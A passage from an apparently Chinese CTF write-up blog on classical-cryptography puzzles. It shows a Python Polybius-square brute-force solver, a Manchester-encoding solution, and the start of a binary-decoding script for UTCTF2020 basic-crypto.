[]</span><br><span class="line">    headlist = []</span><br><span class="line">    x = itertools.permutations(head, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        temp = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">        headlist.append(temp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> headlist:</span><br><span class="line">        tmp = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            tmp[i[j - <span class="number">1</span>]] = j</span><br><span class="line">        dic.append(tmp)</span><br><span class="line">    <span class="built_in">print</span>(dic)</span><br><span class="line">    <span class="keyword">return</span> dic</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PolybiusSolve</span>():</span><br><span class="line">    <span class="comment"># 创建方阵</span></span><br><span class="line">    polybius()</span><br><span class="line">    dic = listall()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">2</span>):</span><br><span class="line">            plaintext += polybiusd[i[ciphertext[j]]][i[ciphertext[j+<span class="number">1</span>]]]</span><br><span class="line">        <span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PolybiusSolve()</span><br><span class="line"><span class="comment"># flagi\jspolybi\jus</span></span><br><span class="line"><span class="comment"># flagispolybius</span></span><br></pre></td></tr></table></figure><p>没有将i和j单独分开是因为会造成很多麻烦，所以这里要根据”语境”对是’i’或’j’来进行研判。</p><h3 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h3><h4 id="BJDCTF2020-编码与调制"><a href="#BJDCTF2020-编码与调制" class="headerlink" title="[BJDCTF2020]编码与调制"></a>[BJDCTF2020]编码与调制</h4><p><strong>TAG: 曼彻斯特编码</strong></p><p><img src="/2021/05/28/CTF//image-20210727124821706.png"></p><p>使用下载的软件解，按步骤进行即可，最后解码得出的十六进制为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">024A447B4469664D616E63686573746572636F64657D</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210727125204272.png"></p><p>再在线解一下即得flag</p><h3 id="复杂古典密码"><a href="#复杂古典密码" class="headerlink" title="复杂古典密码"></a>复杂古典密码</h3><blockquote><p>所谓复杂，也不过就是多了几层套娃而已，近年来的套娃与爆破之风愈演愈烈，固而有此分类。</p></blockquote><h4 id="UTCTF2020-basic-crypto"><a href="#UTCTF2020-basic-crypto" class="headerlink" title="[UTCTF2020]basic-crypto"></a>[UTCTF2020]basic-crypto</h4><p>写个简单脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="built_in">chr</span>(<span class="built_in">int</span>(x, <span class="number">2</span>)), <span class="string">&quot;&quot;&quot;01010101 01101000 00101101 01101111 01101000 00101100 00100000 </span></span><br><span class="line"><span class="string">01101100 01101111 01101111 01101011 01110011 00100000 01101100 01101001 01101011 01100101 00100000 01110111 01100101 </span></span><br><span class="line"><span class="string">00100000 01101000 01100001 01110110 01100101 00100000 01100001 01101110 01101111 01110100 01101000 01100101 01110010 </span></span><br><span class="line"><span class="string">00100000 01100010 01101100 01101111 01100011 01101011 00100000 01101111 01100110 00100000 01110100 01100101 01111000 </span></span><br><span class="line"><span class="string">01110100 00101100 00100000 01110111 01101001 01110100 01101000 00100000 01110011 01101111 01101101 01100101 00100000 </span></span><br><span class="line"><span class="string">01110011 01101111 01110010 01110100 00100000 01101111 01100110 00100000 01110011 01110000 01100101 01100011 01101001 </span></span><br><span class="line"><span class="string">01100001 01101100 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00101110 00100000 </span></span><br><span class="line"><span class="string">01000011 01100001 01101110 00100000 01111001 01101111 01110101 00100000 01100110 01101001 01100111 01110101 01110010 </span></span><br><span class="line"><span class="string">01100101 00100000 01101111 01110101 01110100 00100000 01110111 01101000 01100001 01110100 00100000 01110100 01101000 </span></span><br><span class="line"><span class="string">01101001 01110011 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00100000 01101001 </span></span><br><span class="line"><span class="string">01110011 00111111 00100000 00101000 01101000 01101001 01101110 01110100 00111010 00100000 01101001 01100110 00100000 </span></span><br><span class="line"><span class="string">01111001 01101111 01110101 00100000 01101100 01101111 01101111 01101011 00100000 01100011 01100001 01110010 01100101 </span></span><br><span class="line"><span class="string">01100110 01110101 01101100 01101100 01111001 00101100 00100000 01111001 01101111 01110101 00100111 01101100 01101100 </span></span><br><span class="line"><span class="string">00100000 01101110 01101111 01110100 01101001 01100011 01100101 00100000 01110100 01101000 01100001 01110100 00100000 </span></span><br><span class="line"><span class="string">01110100 01101000 01100101 01110010 01100101 00100000 01101111 01101110 01101100 01111001 00100000 01100011 01101000 </span></span><br><span class="line"><span class="string">01100001 01110010 01100001 01100011 01110100 01100101 01110010 01110011 00100000 01110000 01110010 01100101 01110011 </span></span><br><span class="line"><span class="string">01100101 01101110 01110100 00100000 01100001 01110010 01100101 00100000 01000001 00101101 01011010 00101100 00100000 </span></span><br><span class="line"><span class="string">01100001 00101101 01111010 00101100 00100000 00110000 00101101 00111001 00101100 00100000 01100001 01101110 01100100 </span></span><br><span class="line"><span class="string">00100000 01110011 01101111 01101101 01100101 01110100 01101001 01101101 01100101 01110011 00100000 00101111 00100000 </span></span><br><span class="line"><span class="string">01100001 01101110 01100100 00100000 00101011 00101110 00100000 01010011 01100101 01100101 00100000 01101001 01100110 </span></span><br><span class="line"><span class="string">00100000 01111001 01101111 01110101 00100000 01100011 01100001 01101110 00100000 01100110 01101001 01101110 01100100 </span></span><br><span class="line"><span class="string">00100000 01100001 01101110 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00100000 </span></span><br><span class="line"><span class="string">01110100 01101000 01100001 01110100 00100000 01101100 01101111 01101111 01101011 01110011 00100000 01101100 01101001 </span></span><br><span class="line"><span class="string">01101011 01100101 00100000 01110100 01101000 01101001 01110011 00100000 01101111 01101110 01100101 00101110 00101001 </span></span><br><span class="line"><span class="string">00001010 01010100 01101101 01010110 00110011 01001001 01000111 01001110 01101111 01011001 01010111 01111000 01110011 </span></span><br><span class="line"><span class="string">01011010 01010111 00110101 01101110 01011010 01010011 01000101 01100111 01010001 00110010 01000110 01110101 01001001 </span></span><br><span class="line"><span class="string">01001000 01101100 01110110 01100100 01010011 01000010 01101101 01100001 01010111 01100100 00110001 01100011 01101101 </span></span><br><span class="line"><span class="string">01010101 01100111 01100010 00110011 01010110 00110000 01001001 01001000 01100100 01101111 01011001 01011000 01010001 </span></span><br><span class="line"><span class="string">01101110 01100011 01111001 01000010 01101110 01100010 00110010 01101100 01110101 01011010 01111001 01000010 01110110 </span></span><br><span class="line"><span class="string">01100010 01101001 01000010 01101111 01011010 01011000 01001010 01101100 01010000 01111001 01000010 01001010 01100100 </span></span><br><span class="line"><span class="string">01000011 01000010 01110011 01100010 00110010 00111001 01110010 01100011 01111001 01000010 01110011 01100001 01010111 </span></span><br><span class="line"><span class="string">01110100 01101100 01001001 01001000 01010010 01101111 01011010 01010011 01000010 01110011 01011010 01011000 01010010 </span></span><br><span class="line"><span class="string">00110000 01011010 01011000 01001010 01111010 01001001 01000111 01000110 01111001 01011010 01010011 01000010 01111010 </span></span><br><span class="line"><span class="string">01100001 01000111 01101100 01101101 01100100 01000111 01010110 01101011 01001001 01000111 01001010 00110101 01001001 </span></span><br><span class="line"><span class="string">01001000 01001110 01110110 01100010 01010111 01010101 01100111 01011001 00110010 00111001 01110101 01100011 00110011 </span></span><br><span class="line"><span class="string">01010010 01101000 01100010 01101110 01010001 01110101 01001001 01000011 01101000 01101111 01100001 01010111 00110101 </span></span><br><span class="line"><span class="string">00110000 01001111 01101001 01000010 00110101 01100010 00110011 01010101 01100111 01100010 01010111 01101100 01101110 </span></span><br><span class="line"><span class="string">01100001 01001000 01010001 01100111 01100100 00110010 01000110 01110101 01100100 01000011 01000010 00110000 01100010 </span></span><br><span class="line"><span class="string">01111001 01000010 01111010 01100100 01000111 01000110 01111001 01100100 01000011 01000010 01110011 01100010 00110010 </span></span><br><span class="line"><span class="string">00111001 01110010 01100001 01010111 00110101 01101110 01001001 01001000 01010110 01110111 01001001 01000110 01001010 </span></span><br><span class="line"><span class="string">01110110 01100010 01010111 01000110 01110101 01001001 01001000 01000010 01101100 01100010 00110011 01000010 01110011 </span></span><br><span class="line"><span class="string">01011010 01010011 01101011 01110101 01000011 01101101 01110100 00110010 01011001 01101110 01001110 01111000 01100011 </span></span><br><span class="line"><span class="string">01101101 01010001 01110011 01001001 01000111 01101100 00110101 01011010 01010011 01100100 01101001 01100010 01111001 </span></span><br><span class="line"><span class="string">01000010 01110010 01100100 01101110 01100100 00110101 01011001 00110010 01010001 01100111 01011010 01001000 01001010 </span></span><br><span class="line"><span class="string">01110110 01011001 01101101 00111000 01101000 01001001 01000110 01101000 00110101 01011010 01111001 01000010 01110111 </span></span><br><span class="line"><span class="string">01100101 01010111 01001001 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01000010 01111010 01100101 </span></span><br><span class="line"><span class="string">01000111 01110100 00110010 01001001 01000011 01101000 01110010 01100101 01000111 00110100 01100111 01100100 00110010 </span></span><br><span class="line"><span class="string">01110100 01110000 01100010 01000111 00111000 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01001010 </span></span><br><span class="line"><span class="string">01110010 01011001 01101101 00110101 01110110 01011001 00110010 01010001 01110101 01001100 01101001 00110100 01110000 </span></span><br><span class="line"><span class="string">01001001 01001000 01110000 01110010 01011001 01101101 01010001 00110110 01001001 01000111 01110011 01100111 01011001 </span></span><br><span class="line"><span class="string">00110010 01010110 01110011 01011001 00110010 01010010 01111010 01011010 01000111 01010110 01101011 01100011 00110011 </span></span><br><span class="line"><span class="string">01101100 00110100 01001001 01000111 00110001 01111010 01100101 01101110 01001010 01110110 01011001 01101001 00110100 </span></span><br><span class="line"><span class="string">01100111 01010101 00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01000010 00110101 </span></span><br><span class="line"><span class="string">01100100 01101110 01011010 00110101 01011010 00110011 01001110 00110100 01100011 01010011 01000010 01101011 01100010 </span></span><br><span class="line"><span class="string">00110010 01101000 01101011 01001100 01000011 01000010 01010100 01001010 00110010 01011010 01110110 01001001 01000111 </span></span><br><span class="line"><span class="string">01010010 01110010 01100100 01010111 00111001 00110100 01001001 01001000 01100100 01110000 01001001 01001000 01100100 </span></span><br><span class="line"><span class="string">01110110 01011001 00110010 01001110 01110010 01100011 01010111 00111000 01100111 01100001 00110011 01101000 01110101 </span></span><br><span class="line"><span class="string">01001001 01000111 01001010 01110110 01100101 01101110 01011010 01110010 01100010 01010111 00111001 01110101 01001001 </span></span><br><span class="line"><span class="string">01000111 00111001 01101101 01100010 00110010 01001010 01110000 01001001 01000111 01110100 00110010 01100101 01101110 </span></span><br><span class="line"><span class="string">01001010 01110010 01100010 01000111 00111001 01101011 01100011 00110010 00110000 01100111 01100010 01011000 01001010 </span></span><br><span class="line"><span class="string">01110010 01011001 01101101 01110100 01110100 01011010 01000111 00111001 01101001 01001001 01000111 01100100 01111010 </span></span><br><span class="line"><span class="string">01011010 01001000 01001001 01100111 01100001 01111001 01000010 01110100 01100101 01010111 01001010 01101001 01100010 </span></span><br><span class="line"><span class="string">00110010 01001110 00110110 01100101 01011000 01101000 01110101 01100010 00110011 01101000 01110100 01100010 01111001 </span></span><br><span class="line"><span class="string">01000010 01101011 01100101 01010011 01000010 01110010 01001001 01000111 00110101 01111010 01100011 01001000 01000010 </span></span><br><span class="line"><span class="string">01110110 01011001 01101101 00111001 00110100 01011010 01000011 01000010 01110100 01100011 01101101 01110100 01101001 </span></span><br><span class="line"><span class="string">01100001 00110010 00110001 01101011 01100010 00110010 01001001 01100111 01001100 01010011 01000010 00110001 01100101 </span></span><br><span class="line"><span class="string">01001000 01101100 01101110 01100101 01000011 01000010 01110010 01011001 01111001 01000010 01110010 01001001 01000111 </span></span><br><span class="line"><span class="string">01001110 01101100 01100010 01000111 01001110 01101011 01100011 00110010 01010010 01101100 01011010 01001000 01001110 </span></span><br><span class="line"><span class="string">00110101 01100101 01000011 01000010 01110100 01100011 00110011 01110000 01111001 01100010 00110010 01001001 01110101 </span></span><br><span class="line"><span class="string">01001001 01000101 00110001 01110010 01100101 01000011 01000010 01110000 01100101 01010111 01010101 01100111 01100011 </span></span><br><span class="line"><span class="string">01001000 01001110 00110100 01100010 01101001 01000010 01101011 01100011 01101101 00111000 01100111 01100011 01001000 </span></span><br><span class="line"><span class="string">01001110 00110100 01100001 00110011 01011001 01100111 01100011 01001000 01011010 01110010 01100011 01010100 00111000 </span></span><br><span class="line"><span class="string">01100111 01100011 01101110 01001110 00110100 01011010 01000100 01101111 01100111 01010010 00110010 00111000 01100111 </span></span><br><span class="line"><span class="string">01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 </span></span><br><span class="line"><span class="string">01000111 01010010 01111001 01100010 01111001 01000010 01110111 01100100 01101101 01110100 01111000 01001001 01001000 </span></span><br><span class="line"><span class="string">01001110 01101010 01001001 01001000 01000110 00110101 01100011 00110011 01101000 01111000 01001001 01000111 01010010 </span></span><br><span class="line"><span class="string">00110101 01001001 01000111 01111000 01110110 01001001 01001000 01101100 01110111 01001001 01000111 01010010 01111001 </span></span><br><span class="line"><span class="string">01100010 01111001 01000010 01110111 01100101 01010111 01001010 00110011 01100001 00110010 01010001 01100111 01011010 </span></span><br><span class="line"><span class="string">01010111 01010010 01110111 01100100 01101101 01110100 01111000 01100101 01111001 00110100 01110101 01001100 01101110 </span></span><br><span class="line"><span class="string">00110000 01100111 01001100 01010011 01000010 01101110 01100011 01101110 01001110 01110100 01100011 01101001 01000010 </span></span><br><span class="line"><span class="string">00110011 01100010 00110010 01110100 00110100 01011001 01111001 01000010 01101011 01100011 01101101 01110100 01101011 </span></span><br><span class="line"><span class="string">01001001 01001000 01001110 01110111 01001001 01000111 01101100 00110101 01011010 01010011 01000010 01101010 01100010 </span></span><br><span class="line"><span class="string">00110010 00111000 01100111 01011010 01001000 01001010 01110010 01011010 01000011 01000010 00110110 01100001 00110010 </span></span><br><span class="line"><span class="string">01010010 01101011 01100010 00110010 01001010 00110100 01001100 01000011 01000010 01110000 01100101 01010111 01010101 </span></span><br><span class="line"><span class="string">01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101110 01100011 01101101 01110100 01101011 </span></span><br><span class="line"><span class="string">01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110100 01100101 01010111 01001010 01101001 01100010 </span></span><br><span class="line"><span class="string">00110010 01001110 00110110 01100101 01011000 01101000 01110101 01100010 00110011 01101000 01110100 01100010 00110010 </span></span><br><span class="line"><span class="string">01001101 01100111 01100011 01001000 01101100 01101001 01001001 01000111 01010101 01110011 01001001 01000111 01010001 </span></span><br><span class="line"><span class="string">01110011 01001001 01001000 01000001 01110011 01001001 01001000 01011001 01100111 01100001 01111001 01110111 01100111 </span></span><br><span class="line"><span class="string">01100001 00110011 01101000 01110101 01001001 01001000 01000101 01100111 01100001 00110010 01001010 01110110 01001100 </span></span><br><span class="line"><span class="string">01101001 01000010 01001010 01100101 01010111 01010101 01100111 01100010 01010111 01110100 00110100 01001001 01001000 </span></span><br><span class="line"><span class="string">01110000 01101001 01100101 01010111 01111000 01110010 01100010 01001000 01011010 01110000 01001001 01000111 01100100 </span></span><br><span class="line"><span class="string">00110101 01011001 01101110 01010101 01100111 01100101 01010111 01010110 01101011 01001001 01000111 01010010 01111001 </span></span><br><span class="line"><span class="string">01100010 01111001 01000010 01101001 01100010 00110011 01100100 01110010 01100011 00110011 01101000 01111010 01100101 </span></span><br><span class="line"><span class="string">01001000 01000101 01100111 01100010 01011000 01001010 01110010 01011001 01101101 01110100 01110100 01011010 01000111 </span></span><br><span class="line"><span class="string">00111001 01101001 01011001 01111001 01000010 01110011 01100001 01010011 01000010 01101001 01100010 00110011 01110000 </span></span><br><span class="line"><span class="string">00110010 01100001 00110010 00110001 01111010 01100101 01001000 01000101 01100111 01011010 01001000 01001010 01110110 </span></span><br><span class="line"><span class="string">01100100 01111001 01000010 01110010 01100101 01000111 00110100 01100111 01100011 00110011 01101000 01110111 01100010 </span></span><br><span class="line"><span class="string">00110010 01001010 01101001 01100011 00110011 01101000 01111000 01001001 01000111 00110001 00110101 01100100 00110011 </span></span><br><span class="line"><span class="string">01100100 00110101 01100101 01000011 01000010 01101110 01100101 01010111 01001010 01110101 01011001 01111001 01000010 </span></span><br><span class="line"><span class="string">01111010 01100101 01000011 01000010 01101011 01100011 01101101 00111000 01100111 01010100 00110011 01101000 01111000 </span></span><br><span class="line"><span class="string">01100100 01101110 01001110 01101010 01100011 01101001 01000010 00110010 01100001 00110011 01101000 01111000 01011010 </span></span><br><span class="line"><span class="string">01010111 01110100 01111000 01100010 01111001 00110100 01100111 01010011 00110011 01101000 00110101 01011010 01001000 </span></span><br><span class="line"><span class="string">01001010 01110110 01011001 01101001 01000010 01111000 01011001 01101101 00111001 01110010 01011010 01000011 01000010 </span></span><br><span class="line"><span class="string">00110011 01100010 00110010 01010010 01111001 01100101 01010111 00110100 01100111 01100011 00110010 01001101 01100111 </span></span><br><span class="line"><span class="string">01011010 01001000 01101011 01100111 01011010 01010111 01001110 01110110 01001001 01001000 01000010 01101001 01100010 </span></span><br><span class="line"><span class="string">00110010 01000110 01101100 01100010 00110011 01101000 01110100 01100001 01010011 01000010 01110010 01100101 01000111 </span></span><br><span class="line"><span class="string">01110100 00110010 01100001 01010111 01001110 01111010 01011001 01111010 01101111 01100111 01011010 00110010 00111000 </span></span><br><span class="line"><span class="string">01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101011 01100011 01101101 01110100 01101011 </span></span><br><span class="line"><span class="string">01001001 01000011 01100100 01110110 01001010 01111001 01000010 01101010 01100011 01101110 01101100 01101110 01011001 </span></span><br><span class="line"><span class="string">01111001 01000010 01101100 01100101 01101001 01000010 00110011 01100101 01010111 01001110 01101011 01001001 01001000 </span></span><br><span class="line"><span class="string">01101100 01110111 01011010 01000111 00111001 00110100 01001001 01001000 01001110 00110100 01001001 01000111 01010010 </span></span><br><span class="line"><span class="string">01111001 01100010 01111001 01000010 01110010 01100100 01101110 01110000 01111001 01100001 00110010 01111000 01110110 </span></span><br><span class="line"><span class="string">01011010 01000011 01110111 01100111 01011001 00110011 01101011 01100111 01011010 01001000 01001010 01110010 01011010 </span></span><br><span class="line"><span class="string">01000011 01100100 01101010 01001001 01001000 01110000 01101001 01100101 01010111 01111000 01110010 01100010 01001000 </span></span><br><span class="line"><span class="string">01011010 01110000 01001001 01000111 01010010 01111001 01100010 01111001 01000010 00110011 01100101 01010111 01001110 </span></span><br><span class="line"><span class="string">01101011 01001001 01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01110100 </span></span><br><span class="line"><span class="string">01100011 01101101 01110100 01101001 01100001 00110010 00110001 01101011 01100010 00110010 01001001 01100111 01100011 </span></span><br><span class="line"><span class="string">00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01000111 01010010 01110110 01100001 01000111 </span></span><br><span class="line"><span class="string">01010001 01110011 01001001 01001000 01000010 00110101 01100100 01101110 01011010 00110101 01011010 00110010 00111001 </span></span><br><span class="line"><span class="string">01110101 01001001 01000111 01111000 01110000 01001001 01000011 01100100 01101011 01001010 01111001 01110111 01100111 </span></span><br><span class="line"><span class="string">01100001 00110011 01101000 01110101 01001001 01000111 01001110 00110101 01001001 01001000 01101100 00110100 01001100 </span></span><br><span class="line"><span class="string">01101001 01000010 01011010 01100101 01000111 00110001 01110110 01001001 01000111 01101100 00110101 01011010 01010011 </span></span><br><span class="line"><span class="string">01000010 00110001 01100101 01001000 01101100 01101110 01001001 01000111 01110011 01100111 01100011 01000111 00111001 </span></span><br><span class="line"><span class="string">01101110 01001001 01000111 00110001 01111001 01100001 00110010 01001010 01110010 01100010 01010111 01010010 01110110 </span></span><br><span class="line"><span class="string">01011001 01101101 01001101 01110011 01001001 01000111 01101100 00110101 01011010 01010011 01000010 01110100 01100001 </span></span><br><span class="line"><span class="string">00110011 01100111 01100111 01100011 00110011 01101000 01110111 01100010 00110010 01001001 01100111 01011010 01001000 </span></span><br><span class="line"><span class="string">01001010 01110110 01001001 01000111 01001010 01110110 01011001 00110010 01010001 01100111 01100101 01011000 01000001 </span></span><br><span class="line"><span class="string">01100111 01011010 01001000 01001010 01110110 01001001 01000111 01100100 00110101 01011001 01101101 00110101 01101010 </span></span><br><span class="line"><span class="string">01001001 01000111 01111000 01110010 01011001 00110010 00111001 01110101 01001001 01001000 01101100 00110100 01001001 </span></span><br><span class="line"><span class="string">01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01101110 01100101 01010111 </span></span><br><span class="line"><span class="string">01001010 01110101 01011001 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01000111 01001110 </span></span><br><span class="line"><span class="string">01111001 01100101 01010111 01100011 01100111 01011010 01011000 01101111 01100111 01100011 00110011 01100111 01100111 </span></span><br><span class="line"><span class="string">01011010 01001000 01001010 01110110 01001001 01000101 00111001 00110100 01100011 01011000 01011010 01111010 01011001 </span></span><br><span class="line"><span class="string">00110011 01001001 01100111 01100100 01101101 01110100 00110100 01100011 01010111 01010110 01110010 01100011 01010111 </span></span><br><span class="line"><span class="string">00111000 01110101 01000011 01101110 01001010 01101110 01100001 01000111 00110101 00110100 01100011 00110010 01010010 </span></span><br><span class="line"><span class="string">01101101 01100101 01011000 01001110 01101011 01100100 01000111 01100100 01101111 01100100 01010011 01000101 01100111 </span></span><br><span class="line"><span class="string">01100011 01010111 01100100 01101101 01001001 01000111 01101100 01111010 01011001 01010111 01110011 01100111 01011001 </span></span><br><span class="line"><span class="string">00110011 01010010 01101111 01100100 01001000 01010110 01110000 01100001 00110010 01010101 01100111 01011010 01000111 </span></span><br><span class="line"><span class="string">01101100 01110010 01001001 01001000 01110000 01110010 01100010 01101110 01010010 01101111 01100001 01000111 01110100 </span></span><br><span class="line"><span class="string">00110100 01001001 01001000 01001010 00110100 01100011 01010111 01111000 01101011 01011010 00110010 00110101 00110100 </span></span><br><span class="line"><span class="string">01100011 00110010 01111000 01110000 01100011 01010011 01000010 01111001 01100001 01011000 01001110 00110101 01100101 </span></span><br><span class="line"><span class="string">01010111 01110100 01101111 01100010 01101101 01110011 01110101 01001001 01000111 01101100 01110010 01100101 01000111 </span></span><br><span class="line"><span class="string">01110011 01100111 01100100 01001000 01010101 01100111 01100011 01111001 01000010 01101010 01100101 01011000 01001110 </span></span><br><span class="line"><span class="string">01110101 01001001 01000111 01001110 01101110 01100101 01000011 01000010 01111010 01100101 01011000 01101011 01100111 </span></span><br><span class="line"><span class="string">01100011 01010111 01100100 01101101 01100101 01000011 01000010 01110000 01100011 00110011 01101000 01101100 01001001 </span></span><br><span class="line"><span class="string">01000111 01110100 01101010 01011001 00110010 01100100 00110100 01011010 01001000 01010101 00110110 01001001 01000111 </span></span><br><span class="line"><span class="string">01011010 01101011 01011001 00110011 01101100 01111010 01100010 01101110 01110100 01101111 01001101 01001000 01011010 </span></span><br><span class="line"><span class="string">01100110 01011010 01000111 01101011 00110000 01011010 01001000 01010110 01100110 01100100 01101101 01101011 00110000 </span></span><br><span class="line"><span class="string">01011010 01000110 00111001 00110000 01011000 00110011 01001001 00110000 01100101 01011000 01101100 01100110 01100011 </span></span><br><span class="line"><span class="string">01101110 01101000 01111000 01100010 01000111 01010001 01110111 01100110 01010011 00110100 01100111 01100011 01010111 </span></span><br><span class="line"><span class="string">01100100 01101101 01001001 01001000 01011010 00110000 01100101 01011000 01101011 01100111 01011001 00110011 01010010 </span></span><br><span class="line"><span class="string">01101111 01011010 01010011 01000010 01101011 01100001 01011000 01001110 01101011 01001001 01001000 01001101 01100111 </span></span><br><span class="line"><span class="string">01100101 01010111 01100100 01101011 01001001 01000111 01100100 01101010 01001001 01001000 01001010 00110100 01100011 </span></span><br><span class="line"><span class="string">01010111 01111000 01101011 01011010 00110010 00110101 00110100 01100011 00110010 01111000 01110000 01100011 01010011 </span></span><br><span class="line"><span class="string">01000010 00110000 01100100 01010011 01000010 01110111 01011010 01101110 01010110 01101011 01001001 01001000 01110000 </span></span><br><span class="line"><span class="string">01101101 01100100 01001000 01101100 01101100 01100100 01000111 01101000 01110101 01001001 01000111 01100100 01101010 </span></span><br><span class="line"><span class="string">01011001 01111001 01000010 01101011 01100001 01011000 01010010 00110001 01001001 01001000 01010110 01101110 01100101 </span></span><br><span class="line"><span class="string">01000111 01010001 01100111 01011010 00110010 01001101 01100111 01100101 01101110 01001110 00110001 01100100 01001000 </span></span><br><span class="line"><span class="string">01001001 01100111 01011001 01101101 01101000 01101110 01100100 01101110 01101100 01110010 01011010 01010111 00110101 </span></span><br><span class="line"><span class="string">01110010 01001100 01000011 01000010 01111010 01100001 01000111 01010101 01100111 01100100 01000111 01010001 01100111 </span></span><br><span class="line"><span class="string">01100101 01000111 01110100 01111010 01100101 01011000 01101100 01111000 01001001 01001000 01010010 00110001 01001001 </span></span><br><span 